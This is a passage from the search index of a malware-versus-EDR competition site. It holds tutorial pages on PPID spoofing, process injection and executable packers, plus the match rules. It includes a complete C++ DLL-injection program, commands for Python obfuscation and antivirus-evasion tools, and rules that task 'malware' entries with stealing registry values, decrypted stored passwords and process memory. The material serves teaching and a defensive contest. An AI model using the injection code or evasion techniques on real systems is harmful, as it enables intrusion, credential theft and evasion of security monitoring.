dwCreationFlags parameter.</p> <p>Handles in STARTUPINFO or STARTUPINFOEX must be closed with CloseHandle when they are no longer needed.</p> <p>The <code>STARTUPINFOEX</code> structure contains an <code>lpAttributeList</code>.</p> <p><code>lpAttributeList</code></p> <p>An attribute list. This list is created by the InitializeProcThreadAttributeList function.</p> <p></p> <p>The documentation notes that to add attributes to the list, you need to call the UpdateProcThreadAttribute function.</p> <p>An attribute parameter called <code>Attribute</code>. The <code>PROC_THREAD_ATTRIBUTE_PARENT_PROCESS</code> attribute is used to set the parent process of a new process.</p> <p>Use Cobalt Strike\u2019s Office macro to generate a Word document, and the victim opens the document, it establishes a connection.</p> <p>The example shows that there is a rundll32.exe under word.exe.</p> <p></p> <p>Therefore, PPID Spoofing is designed to evade detection based on the parent-child process relationship.</p>"},{"location":"Learn/Malware/PPID-Spoofing/#refer","title":"Refer","text":"<ol> <li>ired.team : Parent Process ID (PPID) Spoofing</li> <li>Capt. Meelo : Picky PPID Spoofing</li> <li>F-Secure : Detecting Parent PID Spoofing</li> </ol>"},{"location":"Learn/Malware/Process-Injection/","title":"Process Injection","text":"<p>Process injection is a technique used by attackers to execute arbitrary code within the address space of another process. This allows the malicious code to run under the context of a legitimate process, which can help it evade detection by security software and gain elevated privileges.</p>"},{"location":"Learn/Malware/Process-Injection/#how-process-injection-works","title":"How Process Injection Works","text":"<p>A basic process injection technique will include the following steps.</p> <ol> <li>Opening a Target Process: The attacker identifies and opens a handle to the target process using functions like <code>OpenProcess</code>.</li> <li>Allocating Memory in the Target Process: The attacker allocates memory within the target process using <code>VirtualAllocEx</code>.</li> <li>Writing Malicious Code to the Allocated Memory: The malicious code is written into the allocated memory using <code>WriteProcessMemory</code>.</li> <li>Creating a Remote Thread: Finally, the attacker creates a remote thread to execute the malicious code within the context of the target process using <code>CreateRemoteThread</code>.</li> </ol>"},{"location":"Learn/Malware/Process-Injection/#sample-implementation","title":"Sample Implementation","text":"<p>Below is a simplified example of process injection in C++ on Windows:</p> <pre><code>#include &lt;windows.h&gt;\n#include &lt;iostream&gt;\n\nint main() {\n    // The process ID (PID) of the target process\n    DWORD pid = 1234; // Example PID\n    const char* dllPath = \"C:\\\\path\\\\to\\\\malicious.dll\";\n\n    // Step 1: Open the target process\n    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);\n    if (!hProcess) {\n        std::cerr &lt;&lt; \"Failed to open process\" &lt;&lt; std::endl;\n        return 1;\n    }\n\n    // Step 2: Allocate memory in the target process\n    LPVOID pRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);\n    if (!pRemoteMemory) {\n        std::cerr &lt;&lt; \"Failed to allocate memory in target process\" &lt;&lt; std::endl;\n        CloseHandle(hProcess);\n        return 1;\n    }\n\n    // Step 3: Write the DLL path to the allocated memory\n    if (!WriteProcessMemory(hProcess, pRemoteMemory, dllPath, strlen(dllPath) + 1, NULL)) {\n        std::cerr &lt;&lt; \"Failed to write to target process memory\" &lt;&lt; std::endl;\n        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);\n        CloseHandle(hProcess);\n        return 1;\n    }\n\n    // Step 4: Create a remote thread to load the DLL\n    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, pRemoteMemory, 0, NULL);\n    if (!hThread) {\n        std::cerr &lt;&lt; \"Failed to create remote thread\" &lt;&lt; std::endl;\n        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);\n        CloseHandle(hProcess);\n        return 1;\n    }\n\n    // Wait for the remote thread to finish\n    WaitForSingleObject(hThread, INFINITE);\n\n    // Clean up\n    VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);\n    CloseHandle(hThread);\n    CloseHandle(hProcess);\n\n    std::cout &lt;&lt; \"DLL injected successfully\" &lt;&lt; std::endl;\n    return 0;\n}\n</code></pre>"},{"location":"Learn/Malware/Process-Injection/#other-variant-process-injection-techniques","title":"Other Variant Process Injection Techniques","text":"<p>While the above example demonstrates a basic form of process injection, several other techniques exist, each with unique methods and purposes.</p> <ul> <li>APC Injection</li> <li>AtomBombing Injection</li> <li>Breaking BaDDEr</li> <li>CTray</li> <li>PROPagate</li> <li>CLIPBRDWNDCLASS</li> <li>...</li> </ul>"},{"location":"Learn/Malware/Process-Injection/#resource","title":"Resource","text":"<ul> <li>https://github.com/odzhan/injection</li> <li>https://github.com/theevilbit/injection</li> <li>https://www.elastic.co/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process</li> <li>https://www.elastic.co/blog/how-hunt-detecting-persistence-evasion-com</li> <li>https://github.com/AzureGreen/InjectCollection</li> <li>https://github.com/SafeBreach-Labs/pinjectra</li> <li>https://i.blackhat.com/USA-19/Thursday/us-19-Kotler-Process-Injection-Techniques-Gotta-Catch-Them-All.pdf</li> <li>https://unprotect.it/category/process-manipulating/</li> </ul>"},{"location":"Learn/Malware/Packer/","title":"General Packer","text":""},{"location":"Learn/Malware/Packer/#what-is-packer","title":"What is packer?","text":"<p><sup>1</sup></p> <p>A packer is a tool that combines an executable file's code, data, and sometimes resources into a single package. It includes code to unpack the program dynamically and execute it, without altering the program's original purpose.</p>"},{"location":"Learn/Malware/Packer/#what-types-of-packers-are-there","title":"What types of packers are there?","text":"<p>It is generally one or a combination of the following operations:<sup>2</sup></p>"},{"location":"Learn/Malware/Packer/#bundling","title":"Bundling","text":"<p>Makes a single executable with multiple files.</p> <ul> <li>PyInstaller</li> <li>cx_Freeze</li> <li>py2exe</li> <li>PyOxidizer</li> <li>Nuitka</li> <li>Briefcase</li> </ul>"},{"location":"Learn/Malware/Packer/#compression","title":"Compression","text":"<p>Compresses the executable to reduce its original size.</p> <ul> <li>UPX</li> <li>PEtite</li> <li>MPRESS</li> <li>PECompact</li> <li>kkrunchy</li> <li>ASPack</li> </ul>"},{"location":"Learn/Malware/Packer/#obfuscates","title":"Obfuscates","text":"<p>Obfuscates the executable by encodin/gencrypting it.</p> <ul> <li>ExeCryptor</li> <li>ELFCrypt</li> <li>Code Virtualizer</li> <li>Dotfuscator</li> <li>ConfuserEx</li> <li>xorPacker</li> <li>Hyperion</li> </ul>"},{"location":"Learn/Malware/Packer/#protection","title":"Protection","text":"<p>Makes the reversing of the executable harder (i.e. using anti-debugging, anti-tampering or other tricks).</p> <ul> <li>ExeCryptor</li> <li>Themida</li> <li>ASProtect</li> <li>Enigma Protector</li> <li>VMProtect</li> <li>ZProtect</li> </ul>"},{"location":"Learn/Malware/Packer/#virtualization","title":"Virtualization","text":"<p>Embeds a virtual machine that virtualizes the instructions of executable files. It uses a customized and different virtual instruction set every time to protect your application. The virtual machine can be a simple interpreter or a complex virtualization engine, responsible for decrypting and executing the wrapped code at runtime. Virtualization technology creates an abstraction layer, hiding the actual instructions and data of the malicious software within the virtual machine, making reverse engineering and detection more challenging.</p> <ul> <li>Themida</li> <li>ASProtect</li> <li>Enigma Protector</li> <li>VMProtect</li> <li>Molebox</li> </ul>"},{"location":"Learn/Malware/Packer/#what-its-used-for","title":"What it's used for?","text":"<p>Malware authors hide their malicious code behind this compression layer. This code is only decompressed and executed after the malware runs (in runtime mode), which helps malware authors bypass static signature-based detection.</p> <ol> <li>Increased Difficulty for Static Analysis.</li> <li>Obfuscation: Techniques used to obscure the code's logic and structure, making it harder for analysts to understand.</li> <li>Multi-Layer Packing: Employing multiple layers of packing to further complicate analysis and increase resistance to detection.</li> <li>Bypassing Signature Detection.</li> <li>Changing File Signatures: Modifying the executable's file signature to evade detection by security software that relies on file signatures for identification.</li> </ol> <p>By employing these tactics, malicious software authors aim to evade detection by security measures that rely on straightforward identification or behavioral analysis. This layered approach complicates the process for security analysts and software defenses, allowing the malware to operate undetected for longer periods and potentially causing harm to systems and data.</p>"},{"location":"Learn/Malware/Packer/#tools","title":"Tools","text":"<ul> <li>https://github.com/TheAenema/hm-pe-packer</li> <li>https://github.com/Nariod/RustPacker</li> <li>https://github.com/89luca89/pakkero</li> </ul>"},{"location":"Learn/Malware/Packer/#resource","title":"Resource","text":"<ul> <li>https://github.com/frank2/packer-tutorial</li> <li>https://www.codeproject.com/Articles/5317556/Creating-Your-Very-Own-x64-PE-Packer-Protector-fro</li> </ul> <ol> <li> <p>The process of unpacking a sample \u21a9</p> </li> <li> <p>awesome-executable-packing \u21a9</p> </li> </ol>"},{"location":"Learn/Malware/Packer/PythonPacker/","title":"Python Packer","text":""},{"location":"Learn/Malware/Packer/PythonPacker/#obfuscator-source-code","title":"Obfuscator source code","text":"<p>Transform python source code into obfuscated python code.</p>"},{"location":"Learn/Malware/Packer/PythonPacker/#pyobfx-simple-use","title":"PyObfx (Simple use)","text":"<ul> <li>Obfuscates strings, integers, floats, booleans, variable names, and import names.</li> <li>Compress source code (bz2, gz, lzma).</li> <li>This repository has been archived by the owner on Dec 6, 2020.</li> </ul> <pre><code>git clone https://github.com/PyObfx/PyObfx.git &amp;&amp; cd PyObfx\npip install -r requirements.txt\npython PyObfx.py app.py -p lzma\n</code></pre>"},{"location":"Learn/Malware/Packer/PythonPacker/#pyobfuscate-simple-use","title":"PyObfuscate (Simple use)","text":"<ul> <li>Use Marshal for serializing data.</li> <li>Use Base16/32/64 for encoding.</li> <li>Use Zlib for compression.</li> </ul> <pre><code>git clone https://github.com/htr-tech/PyObfuscate.git &amp;&amp; cd PyObfuscate\npython encode.py\n</code></pre>"},{"location":"Learn/Malware/Packer/PythonPacker/#pyarmor-moderate-use","title":"pyarmor (Moderate use)","text":"<ul> <li>Seamless Replacement: Obfuscated scripts remain as standard <code>.py</code> files, allowing them to seamlessly replace the original Python scripts in most cases.</li> <li>Balanced Obfuscation: Offers multiple ways to obfuscate scripts to balance security and performance.</li> <li>Irreversible Obfuscation: Renames functions, methods, classes, variables, and arguments.</li> <li>C Function Conversion: Converts some Python functions to C functions and compiles them into machine instructions using high optimization options for irreversible obfuscation.</li> <li>Script Binding: Binds obfuscated scripts to specific machines or sets expiration dates for obfuscated scripts.</li> <li>The free trial version has some limitations.</li> </ul> <pre><code>pip install pyarmor\npython -m pyarmor.cli\n\n# Obfuscation Source Code\npython -m pyarmor.cli gen app.py\npython dist/app.py\n</code></pre>"},{"location":"Learn/Malware/Packer/PythonPacker/#intensio-obfuscator-moderate-use","title":"Intensio-Obfuscator (Moderate use)","text":"<ul> <li>Replace all names of <code>variables/classes/functions/files-name</code> to random strings with length defined then all chars to their hexadecimal value.</li> <li>Delete all <code>comments</code>, all <code>spaces lines</code>.</li> <li>Padding random <code>snippets code/functions/classes</code> with an always differents values.</li> <li>Provides a high level obfuscation layer to prevent or delay the reading and understanding of your python program.</li> </ul>"},{"location":"Learn/Malware/Packer/PythonPacker/#phantom-evasion-advanced-use","title":"Phantom-Evasion (Advanced use)","text":"<p>Phantom-Evasion is an antivirus evasion tool written in python (both compatible with python and python3) capable to generate (almost) fully undetectable executable even with the most common x86 msfvenom payload.</p> <ul> <li>This repository has been archived by the owner on Nov 7, 2023.</li> </ul>"},{"location":"Learn/Malware/Packer/PythonPacker/#convert-to-executable","title":"Convert to executable","text":""},{"location":"Learn/Malware/Packer/PythonPacker/#pyinstaller","title":"pyinstaller","text":"<p>PyInstaller bundles a Python application and all its dependencies into a single package. The user can run the packaged app without installing a Python interpreter or any modules.</p> <ul> <li>Ease of Distribution: One of the primary advantages of PyInstaller is its ability to create self-contained executable files.</li> <li>Cross-Platform Compatibility: PyInstaller supports cross-compilation, allowing you to create executables for multiple platforms from a single development environment.</li> </ul> <pre><code>pip install pyinstaller\npython -m PyInstaller -F app.py\n./dist/app.exe\n</code></pre>"},{"location":"Learn/Malware/Packer/PythonPacker/#nuitka","title":"nuitka","text":"<p>Nuitka translates the Python modules into a C level program that then uses libpython and static C files of its own to execute in the same way as CPython does.</p> <ul> <li>All optimization is aimed at avoiding overhead, where it's unnecessary.</li> <li>Smaller file size</li> </ul> <pre><code>pip install -U nuitka\npython -m nuitka --standalone --onefile app.py\n</code></pre>"},{"location":"Learn/Malware/Packer/PythonPacker/#pyarmor","title":"pyarmor","text":"<ul> <li>Packing files into one bundle by PyInstaller, py2exe, py2app, cx_Freeze.</li> <li>Themida Protection: Protects obfuscated scripts using Themida (Windows only).</li> </ul> <pre><code># Obfuscation Source Code And Packed\npython -m pyarmor.cli gen --pack onefile .\\app.py\n</code></pre>"},{"location":"Learn/Malware/Packer/PythonPacker/#more-tools","title":"More Tools","text":"<ul> <li>https://github.com/JarVices/MsfMania</li> <li>https://github.com/facundobatista/pyempaq</li> </ul>"},{"location":"Learn/Malware/Packer/PythonPacker/#resource","title":"Resource","text":"<ul> <li>https://www.ringzerolabs.com/2020/09/analyzing-python-malware.html</li> <li>https://www.cyborgsecurity.com/cyborg-labs/python-malware-on-the-rise/</li> </ul>"},{"location":"Rules/","title":"Rules","text":""},{"location":"Rules/#introduction","title":"Introduction","text":"<p>This competition aims to simulate the offensive and defensive confrontations between malware and Endpoint Detection and Response (EDR) systems. Participants can choose to participate as either malware or an EDR system. As the malware, the objective is to successfully steal specific target data and transmit it under the surveillance of the EDR. On the other hand, as the EDR, the goal is to effectively monitor the system and detect any malware lurking within.</p>"},{"location":"Rules/#detail-rules","title":"Detail Rules","text":"<ul> <li>Competition Format</li> <li>Execution Environment</li> <li>Rules for Malware</li> <li>Rules for EDR</li> <li>Prices</li> <li>FAQ</li> </ul>"},{"location":"Rules/Competition-Format/","title":"Competition Format","text":""},{"location":"Rules/Competition-Format/#knockout-match","title":"Knockout Match","text":"<p>The knockout match is held every hour, where participants are paired based on their roles (Malware or EDR). The side that meets the victory conditions in the competition will be retained. If the number of Malware and EDR participants is unequal, there may be one-to-many situations. For example, when the number of Malware is less than EDR, one Malware participant will face multiple EDR participants. In this case, as long as the Malware participant wins in one of the matches, they can advance to the next round. When only one participant remains on one side, all remaining participants will advance to the second stage of the tournament and be awarded prizes.</p> <p>Participants must actively sign up for the knockout match. The version of the malware or EDR used will be the latest version uploaded by the participant by the time that knockout match start. Newly uploaded malware and EDR can only be used in subsequent knockout matches.</p>"},{"location":"Rules/Competition-Format/#tournament","title":"Tournament","text":"<p>In the tournament stage, participants will be paired with opponents with similar score for the competition. The results of each match will be updated based on the ELO point system. The competition will continue until the end of the event, with medals awarded to the top three participants with the highest score.</p> <p>Participants advancing to the tournament from the knockout match do not need to sign up actively. The version of the malware or EDR used will be the latest version used by the participant at the start of the tournament.</p>"},{"location":"Rules/EDR/","title":"Rules for EDR","text":""},{"location":"Rules/EDR/#task","title":"Task","text":"<p>Compile all functions into a single Windows EXE executable. The executable should automatically complete all required tasks without user interaction or parameter input. Identify the malicious program in the environment and upload the answer along with the user ID to the specified location.</p> <p>EDR must reside in the system and cannot terminate after execution.</p>"},{"location":"Rules/EDR/#answer-upload-api-location","title":"Answer Upload API Location","text":"<ul> <li>API: https://x.bombe.digitalplaguedoctors.com/submitEdrAns</li> </ul> <p>This API location can only be accessed within the competition's internal network.</p>"},{"location":"Rules/EDR/#answer-format","title":"Answer Format","text":"<pre><code>{\n  \"answer\": \"malware filename\",\n  \"secret\": \"your secret\"\n}\n</code></pre> <p>Each answer submission must include a <code>secret</code>. You will get a <code>secret</code> after you signup on our contest website. Answers can only be submitted once.</p>"},{"location":"Rules/EDR/#malware-name-format","title":"Malware Name Format","text":"<p>Malware name is: <code>BOMBE_EDR_FLAG_xxx</code>, where <code>xxx</code> is a combination of 32 digits and letters.</p> <p>There will be many other normal programs with the same above format as filenames in the environment. EDR must find the malware among them.</p>"},{"location":"Rules/EDR/#prohibitions","title":"Prohibitions","text":"<ul> <li>Tampering with or making the target file unreadable.</li> <li>Causing a system blue screen (BSOD).</li> <li>Destroying the system environment, causing the program to be unable to execute.</li> <li>Interrupting network connections.</li> </ul>"},{"location":"Rules/EDR/#victory-conditions","title":"Victory Conditions","text":"<p>Find the malware in the environment and submit the malware name to the specified API.</p>"},{"location":"Rules/Execution-Environment/","title":"Execution Environment","text":"<ul> <li>AMI: Private AMI<ul> <li>Based on <code>ami-02f9041628cc2f753</code></li> <li>Disable Windows Defender</li> <li>Install .NET Runtime (6.0 / 8.0), VC_redist (x86/x64)</li> </ul> </li> <li>Architecture: <code>x86-64</code></li> <li>OS Name: <code>Microsoft Windows Server 2022 Datacenter</code></li> <li>OS Version: <code>10.0.20348 N/A Build 20348</code></li> <li>OS Manufacturer: <code>Microsoft Corporation</code></li> <li>OS Configuration: <code>Standalone Server</code></li> <li>OS Build Type: <code>Multiprocessor Free</code></li> <li>Hotfix(s): <code>5 Hotfix(s) Installed., [01]: KB5039889, [02]: KB5012170, [03]: KB5040437, [04]: KB5040571, [05]: KB5034439</code></li> </ul> <p>Both EDR and Malware have Administrator privileges.</p>"},{"location":"Rules/Execution-Environment/#whoami-all","title":"<code>whoami /all</code>","text":"<pre><code>PS C:\\&gt; whoami /all\n\nUSER INFORMATION\n----------------\n\nUser Name                SID\n======================== ============================================\nec2amaz-03r1vr0\\ssm-user S-1-5-21-984892040-1351484306-544312878-1000\n\n\nGROUP INFORMATION\n-----------------\n\nGroup Name                                                    Type             SID          Attributes\n============================================================= ================ ============ ===============================================================\nEveryone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\Local account and member of Administrators group Well-known group S-1-5-114    Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Administrators                                        Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner\nBUILTIN\\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\NETWORK                                          Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group\nMandatory Label\\High Mandatory Level                          Label            S-1-16-12288\n\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                            Description                                                        State\n========================================= ================================================================== =======\nSeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled\nSeSecurityPrivilege                       Manage auditing and security log                                   Enabled\nSeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled\nSeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled\nSeSystemProfilePrivilege                  Profile system performance                                         Enabled\nSeSystemtimePrivilege                     Change the system time                                             Enabled\nSeProfileSingleProcessPrivilege           Profile single process                                             Enabled\nSeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled\nSeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled\nSeBackupPrivilege                         Back up files and directories                                      Enabled\nSeRestorePrivilege                        Restore files and directories                                      Enabled\nSeShutdownPrivilege                       Shut down the system                                               Enabled\nSeDebugPrivilege                          Debug programs                                                     Enabled\nSeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled\nSeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled\nSeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled\nSeUndockPrivilege                         Remove computer from docking station                               Enabled\nSeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled\nSeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled\nSeCreateGlobalPrivilege                   Create global objects                                              Enabled\nSeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled\nSeTimeZonePrivilege                       Change the time zone                                               Enabled\nSeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled\nSeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled\n</code></pre>"},{"location":"Rules/Execution-Environment/#msinfo32","title":"msinfo32","text":""},{"location":"Rules/Execution-Environment/#deviceguard-status","title":"DeviceGuard status","text":""},{"location":"Rules/FAQ/","title":"FAQ","text":""},{"location":"Rules/FAQ/#q-what-happens-if-neither-malware-nor-edr-answers-correctly","title":"Q: What happens if neither Malware nor EDR answers correctly?","text":"<p>In the points match stage, the focus is on updating points, so the ELO scoring system for draws will be used. In the elimination round, the focus is on eliminating unqualified participants. Participants who fail to answer correctly will be eliminated. However, EDR's judgment relies on the presence of malicious behavior by Malware. If Malware does not perform correct answers and shows no malicious behavior, it cannot be used to assess EDR's performance. In this case, if neither Malware nor EDR answers, the Malware participant will be eliminated, and the EDR participant will retain qualification. Below are the scoring and elimination conditions for various situations:</p> <ul> <li>EDR Answer Status: <code>O</code> represents a correct answer, <code>X</code> represents an incorrect answer.</li> <li>Malware Answer Status: <code>O</code> represents a correct answer, <code>X</code> represents an incorrect answer.</li> <li>Environment Check: <code>O</code> represents passing the environment check, <code>X</code> represents failing the environment check, possibly due to BSOD.</li> </ul> EDR Answer Status Malware Answer Status Environment Check Result Elimination O O O EDR MAL X O O MAL EDR O X O EDR MAL O O X CRASH O X X CRASH X O X CRASH X X O DRAW MAL X X X CRASH"},{"location":"Rules/FAQ/#q-can-malware-and-edr-install-kernel-drivers","title":"Q: Can Malware and EDR install kernel drivers?","text":"<p>The competition rules do not restrict participants from installing kernel drivers, but participants need to solve the signature issue of kernel driver installation by themselves. Participants are allowed to use the Bring Your Own Vulnerable Driver (BYOVD) method to install kernel drivers. However, participants need to ensure the stability of the environment. Multiple BSOD situations will be blocked as appropriate.</p>"},{"location":"Rules/FAQ/#q-why-cant-malware-terminate-edr-what-happens-if-edr-is-terminated","title":"Q: Why can't Malware terminate EDR? What happens if EDR is terminated?","text":"<p>In this competition, we focus on the detection capabilities of EDR (Endpoint Detection and Response) and the evasion techniques of malware. In real scenarios, malware entering a system protected by EDR needs to perform privilege escalation to gain the same privileges as EDR. However, to simplify the offensive and defensive processes in the competition, we grant malware the same privileges as EDR directly, making it more challenging for EDR to protect itself from termination.</p> <p>To maintain fairness and challenge in the competition, we have established an important rule: malware must not terminate EDR. If EDR is found to be terminated, we will consider the environment as corrupted and record it as a CRASH state. This rule is intended to encourage participants to focus on technical confrontation rather than relying on terminating security defenses to achieve their goals.</p>"},{"location":"Rules/Malware/","title":"Rules for Malware","text":""},{"location":"Rules/Malware/#task","title":"Task","text":"<p>Compile all functions into a single Windows EXE executable. The executable should automatically complete all required tasks without user interaction or parameter input. There are three targets to steal in the environment. Steal these targets and upload the answers along with the user ID to the specified location.</p>"},{"location":"Rules/Malware/#answer-upload-api-location","title":"Answer Upload API Location","text":"<ul> <li>API: https://x.bombe.digitalplaguedoctors.com/submitMalAns</li> </ul> <p>This API location can only be accessed within the competition's internal network.</p>"},{"location":"Rules/Malware/#answer-format","title":"Answer Format","text":"<pre><code>{\n  \"answer_1\": \"Target 1 answer\",\n  \"answer_2\": \"Target 2 answer\",\n  \"answer_3\": \"Target 3 answer\",\n  \"secret\": \"your secret\"\n}\n</code></pre> <p><code>answer_1</code>, <code>answer_2</code>, <code>answer_3</code> can be uploaded separately or together. Each answer submission must include a <code>secret</code>. You will get a <code>secret</code> after you signup on our contest website. Each answer can only be submitted once.</p>"},{"location":"Rules/Malware/#target-format-and-location","title":"Target Format and Location","text":"<p>You have 3 targets to steal and send to our server.</p> <ul> <li>Registry: <code>answer_1</code> in <code>HKCU:\\SOFTWARE\\BOMBE</code></li> <li>Encrypted SQLite database: <code>C:\\Users\\bombe\\AppData\\Local\\bhrome\\Login Data</code><ul> <li>Decrypt <code>password_value</code> with your <code>secret</code> as key using AES CBC.</li> <li><code>password_value</code> is a value concatenated by IV (16 bytes) and encrypted password.</li> <li><code>password_value</code> is in hex format.</li> </ul> </li> <li>Memory of the specified process: <code>bsass.exe</code></li> </ul> <p>The SQLite database table schema is like the following</p> <pre><code>CREATE TABLE logins (\n    id INTEGER PRIMARY KEY,\n    origin_url TEXT NOT NULL,\n    username_value TEXT NOT NULL,\n    password_value TEXT NOT NULL\n)\n</code></pre> <p>If you are confused, please check out our sample solution https://github.com/bombe-match/bombe-poc.</p> <p>The answer format is: <code>BOMBE_MAL_FLAG_xxx</code>, where <code>xxx</code> is a combination of 32 digits and letters. There are three answers in total.</p>"},{"location":"Rules/Malware/#prohibitions","title":"Prohibitions","text":"<ul> <li>Causing a system blue screen (BSOD).</li> <li>Destroying the system environment, causing the program to be unable to execute.</li> <li>Interrupting network connections.</li> <li>Prohibiting actions that close EDR (ATT&amp;CK T1562.001 Impair Defenses: Disable or Modify Tools), including terminating (terminal) and suspending (suspend) EDR.</li> </ul>"},{"location":"Rules/Malware/#victory-conditions","title":"Victory Conditions","text":"<p>Retrieve three targets in the environment as answers, submit the answers to the specified API, and not be detected by EDR.</p>"},{"location":"Rules/Prices/","title":"Prices","text":"<p>Prices available ONSITE only! Plus, we're giving away FREE stickers. Come grab one!</p>"},{"location":"Rules/Prices/#metal-coins","title":"Metal coins","text":"<p>The one who win the knockout match and advance to the tournament will get a metal coins.</p> <p></p>"},{"location":"Rules/Prices/#medals","title":"Medals","text":"<p>We will provide medals for the top three of tournament.</p> <p></p>"}]}